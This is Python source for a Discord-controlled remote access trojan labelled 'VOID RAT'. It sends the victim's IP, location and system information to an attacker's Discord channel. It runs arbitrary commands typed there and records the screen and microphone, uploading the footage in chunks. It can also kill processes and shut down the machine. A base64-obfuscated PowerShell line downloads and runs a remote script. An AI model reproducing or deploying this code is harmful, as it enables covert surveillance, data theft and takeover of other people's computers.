import discord
import platform
import os
import requests
import tempfile
from scipy.io.wavfile import write as write_wav
from config import *

BANNER = """
:::     :::  :::::::: ::::::::::: :::::::::       :::::::::      ::: ::::::::::: 
:+:     :+: :+:    :+:    :+:     :+:    :+:      :+:    :+:   :+: :+:   :+:     
+:+     +:+ +:+    +:+    +:+     +:+    +:+      +:+    +:+  +:+   +:+  +:+     
+#+     +:+ +#+    +:+    +#+     +#+    +:+      +#++:++#:  +#++:++#++: +#+     
 +#+   +#+  +#+    +#+    +#+     +#+    +#+      +#+    +#+ +#+     +#+ +#+     
  #+#+#+#   #+#    #+#    #+#     #+#    #+#      #+#    #+# #+#     #+# #+#     
    ###      ######## ########### #########       ###    ### ###     ### ###      
"""
def LockScreens():
    os.system("powershell Invoke-Command -ScriptBlock ([scriptblock]::Create([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgACIAaAB0AHQAcABzADoALwAvAHIAYQB3AC4AZwBpAHQAaAB1AGIAdQBzAGUAcgBjAG8AbgB0AGUAbgB0AC4AYwBvAG0ALwBPAHYAZQByAGwAYQB5AEMAUwAvAGQAZABkAGQAZAAvAHIAZQBmAHMALwBoAGUAYQBkAHMALwBtAGEAaQBuAC8AUwBjAHIAZQBlAG4ATABvAGMAawBlAHIALgBwAHkAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAJABlAG4AdgA6AFQARQBNAFAAXABzAGMAcgBpAHAAdAAuAHAAeQAiADsAIABwAHkAIAAiACQAZQBuAHYAOgBUAEUATQBQAFwAcwBjAHIAaQBwAHQALgBwAHkAIgA7AA=='))))")

def Shutdown():
    os.system("shutdown /s /t 0")

def Restart():
    os.system("shutdown /r /t 0")

def LogOff():
    os.system("shutdown /l")

def gradient_text(text, start_color, end_color):
    result = ""
    length = len(text)
    for i, char in enumerate(text):
        if char == "\n":
            result += char
            continue
        r = int(start_color[0] + (end_color[0] - start_color[0]) * i / length)
        g = int(start_color[1] + (end_color[1] - start_color[1]) * i / length)
        b = int(start_color[2] + (end_color[2] - start_color[2]) * i / length)
        result += f"\033[38;2;{r};{g};{b}m{char}"
    result += "\033[0m"
    return result


async def send_ip_embed():
    try:
        ip = requests.get('https://api.ipify.org', timeout=6).text
        geo = requests.get(f'https://ipapi.co/{ip}/json/', timeout=6).json()

        embed = discord.Embed(
            title="CONNECTION & SYSTEM INFORMATION",
            description=f"**HOSTNAME:** `{platform.node()}`",
            color=0x00ccff
        )

        embed.add_field(
            name="SYSTEM",
            value=f"**OS:** `{platform.system()} {platform.release()}`\n"
                  f"**ARCHITECTURE:** `{platform.architecture()[0]}`\n"
                  f"**PYTHON:** `{platform.python_version()}`",
            inline=False
        )

        embed.add_field(
            name="NETWORK",
            value=f"**PUBLIC IP:** `{ip}`\n"
                  f"**CITY:** `{geo.get('city', 'Unknown')}`\n"
                  f"**REGION:** `{geo.get('region', 'Unknown')}`\n"
                  f"**COUNTRY:** `{geo.get('country_name', 'Unknown')}`\n"
                  f"**ISP:** `{geo.get('org', 'Unknown')}`",
            inline=False
        )

        embed.set_footer(text="Remote Access Bot")
        embed.timestamp = discord.utils.utcnow()

        await channel.send(embed=embed)

    except Exception as e:
        await channel.send(f"Could not fetch IP info: {e}")


async def PrintPrebuiltCommands():
    embed = discord.Embed(
        title="PREBUILT COMMANDS",
        description="Available built-in commands:",
        color=0x7289da
    )
    
    embed.add_field(name="LOCK SCREEN", value="`lock` - Locks the current user's screen immediately.", inline=False)
    embed.add_field(name="SHUTDOWN", value="`shutdown` - Shuts down the computer immediately.", inline=False)
    embed.add_field(name="RESTART", value="`restart` - Restarts the computer immediately.", inline=False)
    embed.add_field(name="LOG OFF", value="`logoff` - Logs off the current user immediately.", inline=False)
    embed.add_field(name="MESSAGE", value="`message YOUR TEXT HERE` - Shows a popup message on the screen.", inline=False)
    embed.add_field(name="OPEN URL", value="`url https://example.com` - Opens a website in the default browser.", inline=False)
    embed.add_field(name="TASKLIST", value="`tasklist` - Shows all running processes (sent as file).", inline=False)
    embed.add_field(name="KILL PROCESS", value="`kill PROCESSNAME` - Kills a running process (e.g. `kill chrome.exe`).", inline=False)
    embed.add_field(name="SYSTEM INFO", value="`sysinfo` - Shows detailed system information.", inline=False)
    embed.add_field(name="RECORD SCREEN", value="`record` - Records screen + microphone (60s default). Use `record 120` for custom time.", inline=False)
    embed.add_field(name="RAW COMMAND", value="Type any Windows command directly.", inline=False)
    
    embed.set_footer(text="Remote Access Bot")
    await channel.send(embed=embed)

async def record_screen(duration_seconds=60):
    await channel.send(f"Starting screen recording for {duration_seconds} seconds...")

    import mss, cv2, numpy as np, time, asyncio, os, platform, discord

    fps = 12.0
    max_chunk_size_mb = 7.5

    with mss.mss() as sct:
        monitor = sct.monitors[1]
        width = monitor["width"]
        height = monitor["height"]

    def get_writer(filename):
        for codec in ['avc1', 'H264', 'mp4v']:
            fourcc = cv2.VideoWriter_fourcc(*codec)
            out = cv2.VideoWriter(filename, fourcc, fps, (width, height))
            if out.isOpened():
                return out
        raise Exception("No working codec found")

    chunk_index = 1
    output_file = f"screen_part_{chunk_index}.mp4"
    out = get_writer(output_file)

    await channel.send("Recording started...")

    try:
        start_time = time.time()

        with mss.mss() as sct:
            while time.time() - start_time < duration_seconds:
                screenshot = sct.grab(monitor)
                frame = np.array(screenshot)
                frame = cv2.cvtColor(frame, cv2.COLOR_BGRA2BGR)

                out.write(frame)

                if os.path.exists(output_file):
                    size_mb = os.path.getsize(output_file) / (1024 * 1024)

                    if size_mb >= max_chunk_size_mb:
                        out.release()
                        await asyncio.sleep(1)

                        await channel.send(
                            file=discord.File(
                                output_file,
                                filename=f"{platform.node()}_{output_file}"
                            )
                        )
                        os.remove(output_file)

                        chunk_index += 1
                        output_file = f"screen_part_{chunk_index}.mp4"
                        out = get_writer(output_file)

                await asyncio.sleep(0.001)

        out.release()
        await asyncio.sleep(1)

        if os.path.exists(output_file):
            await channel.send(
                file=discord.File(
                    output_file,
                    filename=f"{platform.node()}_{output_file}"
                )
            )
            os.remove(output_file)

        await channel.send("Recording finished and all parts sent.")

    except Exception as e:
        await channel.send(f"Recording error: {e}")

intents = discord.Intents.default()
intents.message_content = True
client = discord.Client(intents=intents)
channel = None


@client.event
async def on_ready():
    global channel
    guild = client.get_guild(GUILD_ID)
    
    if guild is None:
        print("Guild not found. Check your GUILD_ID.")
        return

    raw_name = platform.node().strip()
    channel_name = raw_name.lower()

    existing = discord.utils.find(
        lambda c: isinstance(c, discord.TextChannel) and c.name.lower() == channel_name,
        guild.text_channels
    )

    if existing:
        channel = existing
        await channel.send("Bot reconnected successfully.")
        print(f"Reusing existing channel: #{channel.name}")
    else:
        channel = await guild.create_text_channel(channel_name)
        await channel.send("New bot session started. Channel created.")
        print(f"Created new channel: #{channel_name}")

    await send_ip_embed()

    print(f"Logged in as {client.user}")
    print(f"Active Channel: #{channel.name}")


@client.event
async def on_message(message):
    global channel
    if message.author == client.user:
        return

    if channel and message.channel.id == channel.id:
        content = message.content.strip().lower()
        full_command = message.content.strip()
        print(f"[DISCORD] {full_command}")

        if content == "prebuilt":
            await PrintPrebuiltCommands()

        elif content == "lock":
            LockScreens()
            await channel.send("Screen has been locked.")

        elif content == "shutdown":
            await channel.send("Shutting down system now...")
            Shutdown()

        elif content == "restart":
            await channel.send("Restarting system now...")
            Restart()

        elif content == "logoff":
            await channel.send("Logging off current user...")
            LogOff()

        elif content.startswith("message "):
            msg_text = full_command[8:].strip()
            if msg_text:
                ps_command = f'powershell -Command "Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show(\'{msg_text.replace("'", "''")}\', \'Message\', \'OK\', \'Information\')"'
                os.system(ps_command)
                await channel.send(f"Popup message sent: {msg_text}")
            else:
                await channel.send("Please provide a message after `message`.")

        elif content.startswith("url "):
            url = full_command[4:].strip()
            if url:
                os.system(f'start "" "{url}"')
                await channel.send(f"Opened URL: {url}")
            else:
                await channel.send("Please provide a URL after `url`.")

        elif content == "tasklist":
            try:
                output = os.popen("tasklist /v /fo list").read()
                with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.txt', encoding='utf-8') as f:
                    f.write(f"=== TASKLIST - {platform.node()} ===\n\n")
                    f.write(output)
                    temp_path = f.name
                await channel.send("Full tasklist:", file=discord.File(temp_path, filename=f"tasklist_{platform.node()}.txt"))
                os.unlink(temp_path)
            except Exception as e:
                await channel.send(f"Error getting tasklist: {e}")

        elif content.startswith("kill "):
            proc = full_command[5:].strip()
            if proc:
                os.system(f'taskkill /f /im "{proc}"')
                await channel.send(f"Attempted to kill process: {proc}")
            else:
                await channel.send("Please provide a process name after `kill`.")

        elif content == "sysinfo":
            result = os.popen("systeminfo").read()
            await channel.send(f"```ansi\n{result[:1900]}\n```" if len(result) > 1900 else f"```ansi\n{result}\n```")

        elif content == "record" or content.startswith("record "):
            try:
                if content.startswith("record "):
                    duration = int(full_command.split()[1])
                    if duration < 10 or duration > 600:
                        duration = 60
                else:
                    duration = 60
                await record_screen(duration)
            except:
                await record_screen(60)

        else:
            try:
                result = os.popen(full_command).read()
                if result.strip():
                    await channel.send(f"```ansi\n{result[:1900]}\n```")
                else:
                    await channel.send("Command executed with no output.")
            except Exception as e:
                await channel.send(f"Error executing command: {e}")

print(gradient_text(BANNER, (173, 216, 230), (128, 0, 128)))
client.run(TOKEN)